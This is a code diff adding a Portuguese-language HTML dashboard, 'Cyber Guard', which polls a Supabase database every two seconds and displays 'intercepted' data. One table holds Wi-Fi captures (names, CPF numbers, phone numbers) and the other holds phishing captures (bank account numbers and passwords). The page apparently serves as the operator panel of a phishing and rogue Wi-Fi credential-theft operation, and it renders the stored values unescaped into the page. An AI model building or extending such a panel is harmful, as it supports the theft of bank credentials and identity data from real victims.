@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Guard - Painel ao Vivo</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
+        body { background: #0f172a; color: #fff; padding: 20px; }
+        h1 { text-align: center; color: #38bdf8; margin-bottom: 20px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; max-width: 1200px; margin: 0 auto; }
+        .box { background: #1e293b; padding: 15px; border-radius: 8px; border: 1px solid #334155; }
+        table { width: 100%; margin-top: 10px; border-collapse: collapse; }
+        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #334155; font-size: 0.85rem; }
+        th { color: #38bdf8; }
+    </style>
+</head>
+<body>
+
+    <h1>🛡️ CYBER GUARD - DADOS INTERCEPTADOS EM TEMPO REAL</h1>
+
+    <div class="grid">
+        <div class="box">
+            <h2>📶 Capturas Wi-Fi</h2>
+            <table>
+                <thead>
+                    <tr><th>Hora</th><th>Nome</th><th>CPF</th><th>Telefone</th></tr>
+                </thead>
+                <tbody id="wifiRows"></tbody>
+            </table>
+        </div>
+
+        <div class="box">
+            <h2>🎣 Capturas Phishing</h2>
+            <table>
+                <thead>
+                    <tr><th>Hora</th><th>Conta</th><th>Senha</th></tr>
+                </thead>
+                <tbody id="phishRows"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        const SUPABASE_URL = 'SUA_PROJECT_URL_AQUI';
+        const SUPABASE_KEY = 'SUA_ANON_KEY_AQUI';
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        async function carregarDados() {
+            // Busca dados do Wi-Fi
+            const { data: wifi } = await supabase.from('wifi_captures').select('*').order('created_at', { ascending: false });
+            document.getElementById('wifiRows').innerHTML = wifi ? wifi.map(r => `
+                <tr>
+                    <td>${new Date(r.created_at).toLocaleTimeString()}</td>
+                    <td>${r.nome}</td>
+                    <td>${r.cpf}</td>
+                    <td>${r.telefone}</td>
+                </tr>
+            `).join('') : '';
+
+            // Busca dados do Phishing
+            const { data: phish } = await supabase.from('phishing_captures').select('*').order('created_at', { ascending: false });
+            document.getElementById('phishRows').innerHTML = phish ? phish.map(r => `
+                <tr>
+                    <td>${new Date(r.created_at).toLocaleTimeString()}</td>
+                    <td>${r.agencia_conta}</td>
+                    <td style="color:#ef4444; font-weight:bold;">${r.senha}</td>
+                </tr>
+            `).join('') : '';
+        }
+
+        // Atualiza os dados na tela a cada 2 segundos
+        setInterval(carregarDados, 2000);
+        carregarDados();
+    </script>
+</body>
+</html>
